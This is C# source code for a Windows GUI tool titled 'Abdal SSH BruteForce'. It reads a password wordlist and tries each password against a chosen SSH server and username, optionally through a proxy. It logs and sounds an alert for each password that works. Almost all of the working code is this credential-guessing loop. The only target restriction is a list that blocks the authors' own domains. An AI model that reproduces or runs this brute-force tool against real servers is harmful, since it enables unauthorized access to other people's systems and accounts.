using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Media;
using System.Reflection;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Telerik.WinControls.UI;
using Abdal_Admin_Finder;
using Telerik.WinControls;


namespace Abdal_Security_Group_App
{
    public partial class Abdal_Admin_Finder : Telerik.WinControls.UI.RadForm
    {

      private  string password_file_name = "";
      private string[] password_file_line = new string[] { };




        public Abdal_Admin_Finder()
        {
            InitializeComponent();
            Version version = Assembly.GetExecutingAssembly().GetName().Version;
            Text = "Abdal SSH BruteForce" + " " + version.Major + "." + version.Minor; //change form title
            bgWorker_ftp_attack.WorkerReportsProgress = true;
            bgWorker_ftp_attack.WorkerSupportsCancellation = true;
        }

        private void EncryptToggleSwitch_ValueChanged(object sender, EventArgs e)
        {
            
        }

 
        private void Abdal_2Key_Triple_DES_Builder_Load(object sender, EventArgs e)
        {
            // Call Global Chilkat Unlock
            Abdal_Security_Group_App.GlobalUnlockChilkat GlobalUnlock = new Abdal_Security_Group_App.GlobalUnlockChilkat();
            GlobalUnlock.unlock();


        }

        private void radMenuItem1_Click(object sender, EventArgs e)
        {

        }

        private void button1_Click(object sender, EventArgs e)
        {
           
        }

        

        private void randButton_Click(object sender, EventArgs e)
        {

           

        }

        private void radButton1_Click(object sender, EventArgs e)
        {
            success_passwordRichTextBox.Items.Clear();
            success_password_links_text.Text = "0";
            AbdalControler.stop_force_process = false;
            success_passwordRichTextBox.Text = "";

            string[] DangerNameArray = { "abdal",
                "ebrasha",
                "hackers.zone",
                "mambanux",
                "nahaanbin",
                "blackwin"};

            // Check Target Url
            foreach (var DangerName in DangerNameArray)
            {

                new Thread(() =>
                {
                    Regex regex = new Regex(@"" + DangerName + ".*");
                    
                        if (regex.Match(sshServerTextBox.Text.ToLower()).Success)
                        {

                           AbdalControler.unauthorized_process = true;
                            
                            
                        }

                    

                }).Start();


            }


            



           if (AbdalControler.unauthorized_process == true)
            {
                MessageBox.Show("This domain is unauthorized !");
                
            }
            else
            {
                if (bgWorker_ftp_attack.IsBusy != true)
                {
                    using (var soundPlayer = new SoundPlayer(@"start.wav"))
                    {
                        soundPlayer.PlaySync(); // can also use soundPlayer.Play()
                    }

                    LogAttackTextEditor.Text = "";
                    radProgressBar1.Value1 = 0;
                    radProgressBar1.Value2 = 0;
                    // Start the asynchronous operation.
                    bgWorker_ftp_attack.RunWorkerAsync();
                }
            }

       




        }

        private void cancelPenTest_Click(object sender, EventArgs e)
        {
           AbdalControler.stop_force_process = true;
            if (bgWorker_ftp_attack.WorkerSupportsCancellation == true)
            {
                // Cancel the asynchronous operation.
                bgWorker_ftp_attack.CancelAsync();
            }


        }

       

        private void bgWorker_req_maker_DoWork(object sender, DoWorkEventArgs e)
        {



            Chilkat.Ssh ssh = new Chilkat.Ssh();
            bool success = false;
            // Connect to an SSH server:
            string ssh_hostname = "";
            int ssh_port = 22 ;
            string ssh_username = "";
            string ssh_password = "";

            if (sshServerTextBox.Text == "")
            {
                MessageBox.Show("SSH Target Is Not valid !");
            }
            else if (AbdalControler.unauthorized_process == true)
            {
                MessageBox.Show("This domain is unauthorized !");
                Application.Exit();


            }
            else
            {

                try
                {



                   

                    int success_password_counter = 0;

                   

                    radRadialGauge.RangeEnd = this.password_file_line.Length;
                    for (int counter = 0; counter <= this.password_file_line.Length; counter++)
                    {
                        if (AbdalControler.stop_force_process == true)
                        {
                            break;
                        }

                        if (FastTrafficGenToggleSwitch.Value == false)
                        {
                            System.Threading.Thread.Sleep(500);
                        }



                        if (this.password_file_line[counter] != "")
                        {
                            

                            radRadialGauge.Value = counter;
                            ssh_hostname = sshServerTextBox.Text;
                            ssh_username = sshUserNameTextBox.Text;
                            ssh_password = this.password_file_line[counter];
                            ssh_port = Convert.ToInt32(sshPortTextBox.Text);
                            
                            

                            if(proxy_ToggleSwitch.Value == true)
                            {

                                ssh.HttpProxyHostname = proxyServerTextBox.Text;
                                ssh.HttpProxyPort = Convert.ToInt32(proxyPortTextBox.Text);

                                ssh.HttpProxyUsername = proxyUserNameTextBox.Text;
                                ssh.HttpProxyPassword = proxyPasswordTextBox.Text;
                                
                                        if (proxyVersionDropDownList.Text == "Basic")
                                        {
                                    ssh.HttpProxyAuthMethod = "Basic";
                                        }
                                        else if(proxyVersionDropDownList.Text == "NTLM")
                                        {
                                    ssh.HttpProxyAuthMethod = "NTLM";
                                        }
                                        else
                                        {
                                            ////
                                        }

                            }


                            success = ssh.Connect(ssh_hostname, ssh_port);
                            if (success == true)
                            {
                                ssh.IdleTimeoutMs = 5000;
                                success = ssh.AuthenticatePw(ssh_username, ssh_password);
                                //Found Password
                                if (success == true)
                                {

                                    success_password_counter++;
                                    success_passwordRichTextBox.Items.Add("[+] " + sshUserNameTextBox.Text + " >>" + " " + this.password_file_line[counter]);
                                    success_password_links_text.Text = success_password_counter.ToString();
                                    using (var soundPlayer = new SoundPlayer(@"pass-foun.wav"))
                                    {
                                        soundPlayer.PlaySync(); // can also use soundPlayer.Play()
                                    }
                                    ssh.Disconnect();
                                }
                                else
                                {
                                    
                                    LogAttackTextEditor.AppendText("[-] " + sshUserNameTextBox.Text + " >>" + " " + this.password_file_line[counter] + Environment.NewLine);
                                    LogAttackTextEditor.SelectionStart = LogAttackTextEditor.Text.Length;
                                    LogAttackTextEditor.ScrollToCaret();

                                    ssh.Disconnect();
                                }
                              
                            }
                            else
                            {
                                //  watch -n 1 "cat /var/log/auth.log | grep 'Failed password'"


                                LogAttackTextEditor.AppendText("Cannot connect to ssh server" + Environment.NewLine);
                                LogAttackTextEditor.SelectionStart = LogAttackTextEditor.Text.Length;
                                LogAttackTextEditor.ScrollToCaret();

                                ssh.Disconnect();

                            }

                           







                        }

                    }




                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.Message);
                }

            } // End else


           

           
           




        }

        private void bgWorker_req_maker_ProgressChanged(object sender, ProgressChangedEventArgs e)
        {
            //radProgressBar1.Value2 = e.ProgressPercentage;
             
//            radRadialGauge1.Value = e.ProgressPercentage;
        }

        private void bgWorker_req_maker_RunWorkerCompleted(object sender, RunWorkerCompletedEventArgs e)
        {
            


            if (e.Cancelled == true)
                    {
                this.radDesktopAlert1.CaptionText = "Abdal SSH BruteForce";
                this.radDesktopAlert1.ContentText = "Canceled Process By User!";
                this.radDesktopAlert1.Show();
                using (var soundPlayer = new SoundPlayer(@"cancel.wav"))
                {
                    soundPlayer.PlaySync(); // can also use soundPlayer.Play()
                }
            }
            else if (e.Error != null)
                    {
                this.radDesktopAlert1.CaptionText = "Abdal SSH BruteForce";
                this.radDesktopAlert1.ContentText = e.Error.Message;
                this.radDesktopAlert1.Show();

                using (var soundPlayer = new SoundPlayer(@"error.wav"))
                {
                    soundPlayer.PlaySync(); // can also use soundPlayer.Play()
                }


            }
            else
                    {
                this.radDesktopAlert1.CaptionText = "Abdal SSH BruteForce";
                this.radDesktopAlert1.ContentText = "Done!";
                this.radDesktopAlert1.Show();
                using (var soundPlayer = new SoundPlayer(@"done.wav"))
                {
                    soundPlayer.PlaySync(); // can also use soundPlayer.Play()
                }

            }

        }

        private void radRadialGauge1_Click(object sender, EventArgs e)
        {

        }

        private void radButton1_Click_1(object sender, EventArgs e)
        {
           
        }

        private void radButton1_Click_2(object sender, EventArgs eSpider)
        {
            
 
            
        }

        private void radButton2_Click(object sender, EventArgs eSpider)
        {
        }

        private void bgWorker_spider_DoWork(object sender, DoWorkEventArgs eSpidere)
        {

            
           

        }

        private void bgWorker_spider_RunWorkerCompleted(object sender, RunWorkerCompletedEventArgs eSpider)
        {



        }

        private void bgWorker_spider_ProgressChanged(object sender, ProgressChangedEventArgs eSpider)
        {
           
        }

        private void radLinearGauge1_Click(object sender, EventArgs e)
        {

        }

        private void radLabel5_Click(object sender, EventArgs e)
        {

        }

        private void radButton1_Click_3(object sender, EventArgs e)
        {
            try
            {
                openFileDialogPasswordFile.AddExtension = false;
                openFileDialogPasswordFile.Title = "SSH Password Attack File";
                openFileDialogPasswordFile.DefaultExt = "txt";
                openFileDialogPasswordFile.Filter = "txt files (*.txt)|*.txt";
                openFileDialogPasswordFile.CheckFileExists = true;
                openFileDialogPasswordFile.CheckPathExists = true;
                openFileDialogPasswordFile.ShowDialog();

                this.password_file_name = openFileDialogPasswordFile.FileName;
                this.password_file_line = File.ReadAllLines(this.password_file_name);

            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
         

        }

        
    }
}
